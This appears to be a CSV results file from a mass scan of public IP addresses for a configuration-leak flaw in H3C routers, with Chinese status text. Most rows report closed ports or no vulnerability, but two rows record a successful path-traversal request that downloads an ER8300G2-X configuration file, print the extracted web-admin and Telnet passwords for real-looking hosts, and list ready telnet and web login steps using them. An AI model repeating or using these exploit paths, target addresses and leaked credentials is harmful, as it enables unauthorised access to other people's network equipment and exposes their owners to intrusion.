+116.31.233.5,9999,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.200.52,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.212.200.151,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.152.117,8181,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.211.58,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.115.60,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.41.139.127,8088,否,配置泄露,,,,,端口未开放，跳过检测
+118.251.177.162,8090,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.95.204,8888,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.41,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.49.245.222,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.168,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.135.165,8083,否,配置泄露,,,,,端口未开放，跳过检测
+125.109.58.231,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.144.132,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.48,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.205.104.138,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.153.176.74,4040,否,配置泄露,,,,,端口未开放，跳过检测
+60.176.207.83,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.87.218,8081,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.62.142,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.14.133,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.225,8089,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.33.4,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.17.236.200,9001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.34,1201,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.73.8,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.47.244,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.220,9090,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.34.88,8989,否,配置泄露,,,,,端口未开放，跳过检测
+61.169.231.28,9090,否,配置泄露,,,,,端口未开放，跳过检测
+115.227.210.151,9001,否,配置泄露,,,,,端口未开放，跳过检测
+1.59.212.156,8888,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.200.37,10001,否,配置泄露,,,,,端口未开放，跳过检测
+114.224.26.223,9001,否,配置泄露,,,,,端口未开放，跳过检测
+60.209.91.90,9090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.200.38,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.201.225,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.3.57,999,否,配置泄露,,,,,端口未开放，跳过检测
+163.142.187.217,1111,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.240.24,10001,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.216.182,8081,否,配置泄露,,,,,端口未开放，跳过检测
+180.102.185.134,60443,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.135.60,1234,否,配置泄露,,,,,端口未开放，跳过检测
+144.123.112.210,8003,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.43,8000,否,配置泄露,,,,,端口未开放，跳过检测
+125.85.178.236,8989,否,配置泄露,,,,,端口未开放，跳过检测
+180.111.103.90,5000,否,配置泄露,,,,,端口未开放，跳过检测
+60.176.83.49,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.36,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.15.10,8089,否,配置泄露,,,,,端口未开放，跳过检测
+111.172.127.4,81,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.15.25,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.203.250,10001,否,配置泄露,,,,,端口未开放，跳过检测
+114.223.254.155,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.200.13,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.209.181,18080,否,配置泄露,,,,,端口未开放，跳过检测
+124.78.36.52,2020,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.214.122,10001,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.101.94,82,否,配置泄露,,,,,端口未开放，跳过检测
+49.75.104.214,10000,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.163,8989,否,配置泄露,,,,,端口未开放，跳过检测
+61.140.112.233,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.31,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.78.240.119,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.33.100.58,2020,否,配置泄露,,,,,端口未开放，跳过检测
+118.251.176.197,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.218.163.162,18888,是,配置泄露,H3C,xkmtjp850413,xkmtjp850413,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://58.218.163.162:18888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 160133 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: xkmtjp850413 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: xkmtjp850413 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 61.147.37.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 58.218.163.162 18888
+       密码: xkmtjp850413
+    2. Web登录: http://58.218.163.162:18888/userLogin.asp
+       密码: xkmtjp850413
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+61.183.231.236,8899,否,配置泄露,,,,,端口未开放，跳过检测
+114.223.41.198,8008,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.101.52,8181,否,配置泄露,,,,,端口未开放，跳过检测
+183.159.207.156,8181,否,配置泄露,,,,,端口未开放，跳过检测
+59.173.172.110,8082,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.214.17,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.44,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.232.230.66,8088,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.246,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.205.78.110,8088,否,配置泄露,,,,,端口未开放，跳过检测
+218.28.96.171,8081,否,配置泄露,,,,,端口未开放，跳过检测
+219.145.102.5,10001,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.152.132,8081,否,配置泄露,,,,,端口未开放，跳过检测
+222.179.92.2,8081,否,配置泄露,,,,,端口未开放，跳过检测
+180.172.148.242,8088,否,配置泄露,,,,,端口未开放，跳过检测
+58.213.192.122,8088,否,配置泄露,,,,,端口未开放，跳过检测
+106.122.175.8,8888,否,配置泄露,,,,,端口未开放，跳过检测
+125.215.238.35,8080,否,配置泄露,,,,,端口未开放，跳过检测
+117.156.54.162,8080,否,配置泄露,,,,,端口未开放，跳过检测
+115.218.15.32,8088,否,配置泄露,,,,,端口未开放，跳过检测
+61.153.79.250,18888,是,配置泄露,H3C,SCzyhh@123,SCzyhh@123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://61.153.79.250:18888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 158719 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: SCzyhh@123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: SCzyhh@123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 218.74.122.74
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 61.153.79.250 18888
+       密码: SCzyhh@123
+    2. Web登录: http://61.153.79.250:18888/userLogin.asp
+       密码: SCzyhh@123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+22,8081,否,配置泄露,,,,,端口未开放，跳过检测
+22,10001,否,配置泄露,,,,,端口未开放，跳过检测
+22,8090,否,配置泄露,,,,,端口未开放，跳过检测
+111.61.136.253,18888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+218.92.178.94,8088,否,配置泄露,,,,,未检测到配置泄露漏洞
+120.197.184.188,8081,否,配置泄露,,,,,未检测到配置泄露漏洞
+223.71.22.162,8090,否,配置泄露,,,,,未检测到配置泄露漏洞
+113.108.105.17,1111,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+221.195.125.122,8081,否,配置泄露,,,,,未检测到配置泄露漏洞
+183.62.24.50,8081,否,配置泄露,,,,,未检测到配置泄露漏洞
+223.108.166.118,8080,否,配置泄露,,,,,未检测到配置泄露漏洞
+14.29.114.239,8088,否,配置泄露,,,,,未检测到配置泄露漏洞
+58.250.89.16,1111,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.196.58.248,999,否,配置泄露,,,,,未检测到配置泄露漏洞
+183.6.100.132,999,否,配置泄露,,,,,未检测到配置泄露漏洞
+59.39.56.186,9090,否,配置泄露,,,,,未检测到配置泄露漏洞
+117.36.148.166,1080,否,配置泄露,,,,,未检测到配置泄露漏洞
+221.179.238.98,8989,否,配置泄露,,,,,未检测到配置泄露漏洞
+222.129.218.6,4433,否,配置泄露,,,,,未检测到配置泄露漏洞
+60.2.185.46,8888,否,配置泄露,,,,,未检测到配置泄露漏洞
